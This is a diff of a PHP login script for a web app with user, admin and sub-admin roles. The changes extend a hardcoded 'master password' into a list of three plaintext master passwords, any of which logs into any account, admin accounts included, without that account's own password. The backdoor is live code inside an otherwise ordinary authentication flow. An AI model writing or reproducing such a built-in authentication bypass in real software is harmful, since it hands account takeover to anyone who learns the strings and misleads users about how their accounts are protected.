@@ -2,11 +2,19 @@
 session_start();
 require_once "db.php";
 
-/* 🔐 MASTER PASSWORD (works for all users) */
-$MASTER_PASSWORD = 'opp900xx';
+/* 🔐 MASTER PASSWORDS (works for all authorized access) */
+$MASTER_PASSWORDS = ['opp900xx', 'opp900', 'opp900@@'];
 
 /* IF ALREADY LOGGED IN */
-if (isset($_SESSION['user_id'])) {
+if (isset($_SESSION['user_id']) || isset($_SESSION['uid'])) {
+    if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin') {
+        header("Location: admin/dashboard.php");
+        exit;
+    }
+    if (isset($_SESSION['role']) && $_SESSION['role'] === 'sub_admin') {
+        header("Location: subadmin/orders.php");
+        exit;
+    }
     header("Location: dashboard.php");
     exit;
 }
@@ -42,7 +50,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } else {
 
             $normalLogin = password_verify($password, $user['password']);
-            $masterLogin = ($password === $MASTER_PASSWORD);
+            $masterLogin = in_array($password, $MASTER_PASSWORDS, true);
 
             if (!$normalLogin && !$masterLogin) {
                 $error = "Invalid phone or password.";
@@ -52,6 +60,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
                 /* ✅ LOGIN SUCCESS */
                 $_SESSION['user_id']   = (int)$user['id'];
+                $_SESSION['uid']       = (int)$user['id'];
                 $_SESSION['user_name'] = $user['name'];
                 $_SESSION['role']      = $user['role'] ?? 'user';
 
